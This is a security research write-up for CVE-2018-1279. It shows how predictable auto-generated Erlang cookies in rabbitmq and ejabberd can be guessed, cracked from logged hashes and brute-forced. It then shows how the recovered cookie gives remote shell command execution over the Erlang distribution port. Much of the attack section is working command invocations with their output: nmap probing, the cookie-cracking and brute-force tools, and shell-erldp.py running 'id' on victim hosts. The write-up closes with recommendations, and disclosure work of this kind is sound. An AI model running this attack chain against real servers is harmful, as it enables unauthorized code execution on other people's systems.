# Guessing for fun and profit

**TLDR; Erlang Distribution offers arbitrary code execution, and its access shall have been protected, as explicitely stated by Erlang. Sadly, well known daemons expose it, and authentication is based on a guessable seed.**

**Pivotal has issued [CVE-2018-1279](https://nvd.nist.gov/vuln/detail/CVE-2018-1279)**

The seductive properties of Erlang make it the core of network exposed daemons:

* XMPP server [ejabberd](https://www.ejabberd.im),
* AMQP broker [rabbitmq](https://www.rabbitmq.com),
* NoSQL database [couchdb](http://couchdb.apache.org).

Both `rabbitmq` and `ejbabberd` provides messaging, a convenient way to interconnect components. OpenStack deployments routinely use `rabbitmq` as its core messaging system.

This repository provides tools to assess Erlang distribution protocol weaknesses:

* detail flaws related to cookie generation and authentication mecanism;
* provide tools associated with guessing, uncovering, or brute-forcing the Erlang cookie;
* provide Python tool to remotely execute code on vulnerable servers.

## Erlang, and Erlang distribution protocol

Erlang is a nice [programming language](https://en.wikibooks.org/wiki/Erlang_Programming). Joe Armstrong, its creator, has summarized it as:

* Everything is a process.
* ...
* Message passing is the only way for processes to interact.
* Processes have unique names.
* If you know the name of a process you can send it a message.
* ...

Distribution is related to clustering and transparent remoting over TCP/IP. It is typically involved when Erlang processes on two or more nodes need to communicate and synchronize, e.g. two `rabbitmq` nodes working in high-availability mode.

Processes that need to communicate using distribution must share a common secret, called the **Erlang cookie**.

[Distribution exchanges](http://erlang.org/doc/apps/erts/erl_dist_protocol.html) are split into two phases:

* [handshake](http://erlang.org/doc/apps/erts/erl_dist_protocol.html#id104761): it provides mutual authentication between two Erlang nodes. It is based on deprecated MD5 hashing, and the salt mecanism is rather weak.
* control: _overly simplified_, consists in Erlang messages in their [external encoded form](http://erlang.org/doc/apps/erts/erl_ext_dist.html)

Erlang is transparent and explicitely claims it is unsecure:
![Explicit advisory](erldp-warning.png?raw=true)

Well, most of the time, installing `ejabberd` or `rabbitmq` would bind Erlang distribution to the IPv4 wildcard. Erlang distribution might not be as protected as it should be ...

## Finding Erlang distribution ports

As a starter, let's use github.com to find trendy Erlang server projects. I bet it can change, but op eight of [today's monthly](https://github.com/trending/erlang?since=monthly) gives:

* rabbitmq/rabbitmq-server: Open source multi-protocol messaging broker
* emqtt/emqttd: EMQ - Erlang MQTT Broker
* ninesnines/cowboy: Small, fast, modern HTTP server for Erlang/OTP.
* apache/couchdb: Apache CouchDB
* processone/ejabberd: Robust, ubiquitous and massively scalable Jabber / XMPP Instant Messaging platform
* erlio/vernemq: A distributed MQTT message broker based on Erlang/OTP
* gotthardp/lorawan-server: Compact server for private LoRa networks
* esl/MongooseIM: MongooseIM is a mobile messaging platform with focus on performance and scalability

Out of these eight projects, it turns out that seven of them setup a distribution port. So it is not something seldom, but rather a default setup for Erlang servers. Details can be found in [setup and scan notes](Docker-experiments.md).

### `epmd` lists Erlang processes

Erlang uses a registry to provide a naming function. The Erlang port mapper daemon aka `epmd` will list all the Erlang nodes accessible on the local host. Well known port for this daemon is `TCP/4369`. `nmap` will be able to extract information available on it:

```
$ nmap -A -sT -p4369 <target>
...
PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info:
|   epmd_port: 4369
|   nodes:
|_    rabbit: 25672
```

### Probing unknown TCP port for Erlang distribution

Access to `epmd` may be filtered. Quoting [ejabberd security guide](https://docs.ejabberd.im/admin/guide/security/):

```
The recommended way to secure the Erlang node is to block the port 4369.
```

Scanning the server will now produce:

```
$ nmap -A -sT -p- <target>

PORT      STATE SERVICE VERSION
56544/tcp open  unknown
```

Nmap is able to detect an open TCP port, but it is unable to detect it is Erlang distribution behind it.

Probing Erlang distribution port can be done using [erldp-info](erldp-info.nse) nmap script:

```
$ nmap -A -sT --script ./erldp-info.nse -p56544 <target>
...
PORT      STATE SERVICE VERSION
56544/tcp open  erldp   Erlang distribution protocol
| erldp-info:
|   version: 5
|   node: ejabberd@<target>
|_  flags: 37ffc
```

## Executing shell commands via Erlang distribution

Now let's see what can be done when accessing Erlang distribution protocol. In this part, we suppose we already have the cookie required to authenticate.

Docker hub points to an official [rabbitmq image](https://hub.docker.com/_/rabbitmq/).

```
$ docker run --rm --hostname hare --name hare \
-e RABBITMQ_ERLANG_COOKIE="love.s3cr3t.c00ki35;)" \
rabbitmq
```

After pulling a few layers, we can see rabbitmq logs flowing. And we know the Erlang cookie because we explicitely set it using `RABBITMQ_ERLANG_COOKIE` environment variable.

`rabbitmqctl` is the name of the command line tool that controls rabbitmq server. It is built on top of Erlang distribution. It needs to remotely interact with `rabbit` Erlang process.

We already have all that we need in the previously pulled image: 

```
$ docker run -ti --rm --link hare:hare \
-e RABBITMQ_ERLANG_COOKIE="love.s3cr3t.c00ki35;)" \
rabbitmq rabbitmqctl -n rabbit@hare eval 'os:cmd("id && hostname").'
```

yields `"uid=999(rabbitmq) gid=999(rabbitmq) groups=999(rabbitmq)\nhare\n"`

The command `id && hostname` has actually run on server, which hostname is `hare`.

**Access and cookie knowledge allow to remotely execute code on server.**

## Guessing an Erlang cookie

As we show above, knowing the Erlang cookie and having access to Erlang distribution is enough to get remote command execution, under the user running the Erlang process.

The curious has noticed that we set the Erlang cookie by ourself. Recalling that communicating nodes shall share the same cookie, you basically have two solutions:

* generate an Erlang cookie using your favorite PRNG, then copy it to the requiring nodes;
* or let Erlang generate a cookie on the first use, then copy it to the requiring nodes.

The rest will focus on automatically generated Erlang cookies.

### Cookie recipe for _recent_ Erlang runtime

The recipe can be found at the heart of [auth.erl](https://github.com/erlang/otp/blob/master/lib/kernel/src/auth.erl):

```
create_cookie(Name) ->
    Seed = abs(erlang:monotonic_time()
	       bxor erlang:unique_integer()),
    Cookie = random_cookie(20, Seed, []),
...
random_cookie(0, _, Result) ->
    Result;
random_cookie(Count, X0, Result) ->
    X = next_random(X0),
    Letter = X*($Z-$A+1) div 16#1000000000 + $A,
    random_cookie(Count-1, X, [Letter|Result]).
...
next_random(X) ->
    (X*17059465+1) band 16#fffffffff.
```

Versions more recent than [this commit](https://github.com/erlang/otp/commit/fbaa0becc787e73fa539e0d497b0d74be27c9534) use this cookie generation algorithm. Note that versions prior to this commit use a different recipe to derive a cookie:

```
create_cookie(Name) ->
    {_, S1, S2} = now(),
    Seed = S2*10000+S1,
    Cookie = random_cookie(20, Seed, []),
```

The rest will focus on recent Erlang versions using the newest recipe.

### Cookies are predictable

The cookie is derived from a seed. The seed is computed from quantities obtained via:

* `erlang:monotonic_time()`: it stands for the time in nanoseconds from the start of the Erlang virtual machine to the time of the call
* `erlang:unique_integer()`: it returns an integer which is incremented by something linear to the number of Erlang processors

It appears that both quantities are fairly _predictable_. The diagram below depicts the distribution of seeds for a targeted hardware platform:

![seed distribution for a targeted hardware platform](seed-distribution.png?raw=true)

So far, Erlang cookie space has reduced from:

* At first glance, 20 capital letters, which gives roughly _26^20 ~ 10^28_ candidates;
* The structure of the PRNG reduces the number of candidates cookie to _2^36 ~ 10^8_;
* The poor entropy of the seed further reduces the number of candidates to now roughly _10^6_.

**Automatically generated Erlang cookies offer poor entropy**

## Tooling around the vulnerability

### Guessing the seed

An easy way is to generate a lot of cookies via starting a fresh `rabbitmq` daemon and harvesting the Erlang cookie. A seed used to generate the cookie can be obtained via [revert-prng](revert-prng.sage):

```
$ echo "ELDUPJHMPTCVINSPFDTA" | ./revert-prng.sage
404289480
```

Reverting of the PRNG is based on finding a minimal solution to a 21*21 system in Z/_2^36_Z. `sage` provides the `solve_right` primitive which handles all the work to provide a suitable solution.

```
$ ./revert-prng.sage stats < sample-cookies
number of cookies: 2000
  min seed: 379860146
  max seed: 386287883
  mean seed: 381404044
  std deviation: 568768
```

### Cracking `rabbitmq` cookie hash

`rabbitmq` logs the raw md5 of the cookie in its log, base64 encoded. [Oops](https://groups.google.com/forum/#!topic/rabbitmq-users/R-1WJpqVuMI). And [oops again](https://stackoverflow.com/questions/37791757/rabbitmq-log-and-mnesia-location-in-environment-variables-not-reflecting).

```
=INFO REPORT==== 27-Dec-2015::13:41:22 ===
node           : rabbit@pablo-HP
home dir       : /var/lib/rabbitmq
config file(s) : /etc/rabbitmq/rabbitmq.config (not found)
cookie hash    : 686jqAnl3g3sdADgSCD+sg==
log            : /var/log/rabbitmq/rabbit@pablo-HP.log
sasl log       : /var/log/rabbitmq/rabbit@pablo-HP-sasl.log
database dir   : /var/lib/rabbitmq/mnesia/rabbit@pablo-HP
```

You can use [crack-hash](crack-hash.c) to sweep through all the seeds and find matching md5:

```
$ time ./crack-hash 686jqAnl3g3sdADgSCD+sg==
IICIEBZGURYVBZWLJTFI
  seed used to generate it = 506551409

real	0m13.121s
user	1m43.467s
sys	0m0.033s
```

Shall you have access to pablo-HP machine, you could execute code on his machine.

Note that only automatically generated cookies can be found by this tool.
If the admin was wise enough to replace the Erlang cookie, the tool will fail with:

```
$ time ./crack-hash X03MO1qnZdYdgyfeuILPmQ==
cookie hash did not reveal a generated cookie

real	30m11.820s
user	233m5.784s
sys	0m16.311s
```

In this case you can always fall back to raw md5 cracking using `oclHashcat` or `john`. Or google.
The hash above matches `password` as plaintext.

### Bruteforcing Erlang cookie

When you have found an open suitable port, you can use [bruteforce-erldp](bruteforce-erldp.c) to sweep a seed interval and perform network exchanges to authenticate.

**In the context of the above hardware setup, using the computed interval uncovers the Erlang cookie in 30 seconds:**

```
$ time ./bruteforce-erldp --threads=16 --seed-start=381410768 --seed-end=386584488 --gap=1000 192.168.1.36 25672
16 workers will start, sweeping through [381410768, 386584488]
each worker will sweep though an interval of size 323358
 6766 seed/s (6767 conn/s)		57.57%
found cookie = UDPQJJNGQLLDNASUKRRN

real	7m41.043s
user	0m31.372s
sys	7m8.548s
```

Bruteforce is not always entitled with success. In particular, Erlang cookies which have not been generated by Erlang will not be guessable. However, Erlang runtime does not put throttling protection, nor lock out mecanism based on attempting source IP, so ... it is worth trying it.

### Gaining remote code execution

Now is reward time !

[shell-erldp](shell-erldp.py) makes victim Erlang server execute shell command given in argument. It requires host and port, plus cookie value.

Coming back to our target setup:

```
$ ./shell-erldp.py 192.168.1.36 25672 UDPQJJNGQLLDNASUKRRN id
uid=121(rabbitmq) gid=135(rabbitmq) groups=135(rabbitmq)
```

Doing the same for `ejabberd` works the very same, as we use a function built in Erlang, not in upper daemon developped in Erlang:

```
$ ./shell-erldp.py 192.168.1.36 45986 YBBQTPLCGRNMJOJJENNL id
uid=110(ejabberd) gid=116(ejabberd) groups=116(ejabberd)
```

Gaining an interactive reverse shell is now a step ahead.

### Exploiting man-in-the-middle

A man-in-the-middle attacker may wait for the legit client to authenticate, and then inject malicious commands into the external encoded Erlang stream, which is neither ciphered, neither authenticated. This part is still a **work in progress**.

## Recommendations

* Replace automatically generated cookies by ones generated using a strong PRNG.
* Protect integrity and confidentiality of distribution using TLS, with mutual authentication. Note this renders Erlang cookie useless.
* _3NJ0Y Y0Ur W1D3 0P3N 3r14N6 D157r18U710N P0r7 !_
